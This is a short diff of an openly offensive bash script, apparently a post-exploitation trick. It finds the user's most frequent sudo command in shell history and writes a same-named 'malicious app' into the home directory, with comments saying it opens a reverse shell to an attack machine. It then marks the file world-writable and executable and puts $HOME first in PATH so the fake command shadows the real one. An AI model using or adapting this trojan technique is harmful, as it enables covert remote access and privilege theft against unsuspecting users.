@@ -4,7 +4,7 @@ common=`history | grep sudo | awk '{print $2, $3}' | sort | uniq -c | sort -nr |
 location=`whereis $common | awk '{print $2}'`
 
 # create malicious app
-cat << EOF > ~/$common
+cat << EOF > $HOME/$common
 #!/bin/bash
 # open reverse shell 
 # change IP and Port to your attack machine settings
@@ -16,7 +16,7 @@ $location $1 $2 $3 $4 $5 $6 $7 $8 $9
 EOF
 
 # make new app executable
-chmod 777 ~/$common
+chmod 777 $HOME/$common
 
 # add HOME directory to the PATH
 export PATH=$HOME:$PATH
